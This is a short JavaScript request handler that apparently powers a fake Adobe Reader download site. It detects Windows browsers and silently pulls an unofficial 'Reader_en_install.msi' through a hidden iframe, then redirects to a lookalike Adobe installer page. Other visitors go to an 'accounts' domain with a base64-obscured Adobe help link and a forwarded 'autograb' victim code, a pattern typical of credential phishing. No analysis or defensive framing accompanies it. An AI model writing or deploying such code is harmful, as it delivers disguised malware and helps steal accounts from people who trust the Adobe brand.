import fs from 'fs';
import path from 'path';

export default function handler(req, res) {
  const userAgent = req.headers['user-agent'] || "";
  const isWindows = /windows/i.test(userAgent);

  if (isWindows) {
    // HTML page that triggers MSI download and redirects
    const html = `
      <!DOCTYPE html>
      <html>
        <head>
          <meta charset="UTF-8">
          <title>Download</title>
        </head>
        <body>
          <p>Your download will start shortly...</p>
          <script>
            // Trigger download via hidden iframe
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = '/Reader_en_install.msi';  // exact filename in /public
            document.body.appendChild(iframe);

            // Redirect after delay
            setTimeout(() => {
              window.location.href = 'https://jomry.com/adobe-readers/installer/download.html';
            }, 3000); // 3 seconds
          </script>
        </body>
      </html>
    `;

    res.setHeader('Content-Type', 'text/html');
    res.status(200).send(html);

  } else {
    // Get 'smn' from query string if present
    const url = new URL(req.url, 'http://localhost'); // base needed for parsing
    const smn = url.searchParams.get('smn');
    let redirectUrl = 'https://accounts.bsmszq.icu?BTqoJQbzww=aHR0cHM6Ly9oZWxweC5hZG9iZS5jb20vY2EvYWNyb2JhdC9rYi9jYW50LW9wZW4tcGRmLmh0bWw=';

    // Append autograb code if present
    if (smn) {
      redirectUrl += `&smn=${encodeURIComponent(smn)}`;
    }

    res.writeHead(302, { Location: redirectUrl });
    res.end();
  }
}
